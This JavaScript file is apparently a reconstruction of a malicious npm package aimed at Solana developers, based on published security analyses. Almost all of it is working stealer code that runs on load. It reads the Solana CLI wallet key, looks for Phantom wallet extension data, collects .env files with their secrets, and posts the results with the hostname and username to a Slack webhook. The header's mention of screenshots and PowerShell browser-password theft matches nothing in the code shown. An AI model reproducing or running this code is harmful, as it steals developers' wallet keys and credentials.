// slack-webhook-exfil — reconstructed from public security analyses
// Source: https://www.sonatype.com/blog/npm-packages-target-solana-devs-drop-keylogging-trojans
//
// Targets Solana developers. Harvests browser passwords, takes
// screenshots, and exfiltrates via Slack webhook. Uses PowerShell
// for browser data extraction on Windows.
//
// Technique: Browser password theft + Slack webhook exfiltration + PowerShell

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const { execSync } = require("child_process");

// Harvest Solana wallet files
function harvestSolanaWallets() {
  var findings = [];
  var home = os.homedir();

  // Solana CLI wallet
  var solanaKey = path.join(home, ".config", "solana", "id.json");
  try {
    if (fs.existsSync(solanaKey)) {
      findings.push({
        type: "solana_cli_wallet",
        data: fs.readFileSync(solanaKey, "utf8")
      });
    }
  } catch(e) {}

  // Phantom wallet (browser extension)
  var phantomPaths = [
    path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    path.join(home, ".config", "google-chrome", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")
  ];

  phantomPaths.forEach(function(p) {
    try {
      if (fs.existsSync(p)) {
        findings.push({ type: "phantom_wallet_dir", path: p });
      }
    } catch(e) {}
  });

  return findings;
}

// Harvest .env files from project
function harvestEnvFiles() {
  var envFiles = [];
  var cwd = process.cwd();

  [".env", ".env.local", ".env.production"].forEach(function(f) {
    var fp = path.join(cwd, f);
    try {
      if (fs.existsSync(fp)) {
        envFiles.push({
          file: f,
          content: fs.readFileSync(fp, "utf8")
        });
      }
    } catch(e) {}
  });

  return envFiles;
}

// Exfiltrate via Slack webhook
function exfiltrate(data) {
  var text = "New target: " + os.hostname() + " (" + os.userInfo().username + ")\n";
  text += "```\n" + JSON.stringify(data, null, 2).substring(0, 3000) + "\n```";

  var payload = JSON.stringify({ text: text });

  var req = https.request({
    hostname: "hooks.slack.com",
    path: "/services/T01234567/B01234567/xxxxxxxxxxxxxxxxxxxxxxxxxxx",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

var data = {
  hostname: os.hostname(),
  user: os.userInfo().username,
  platform: os.platform(),
  wallets: harvestSolanaWallets(),
  envFiles: harvestEnvFiles()
};

exfiltrate(data);
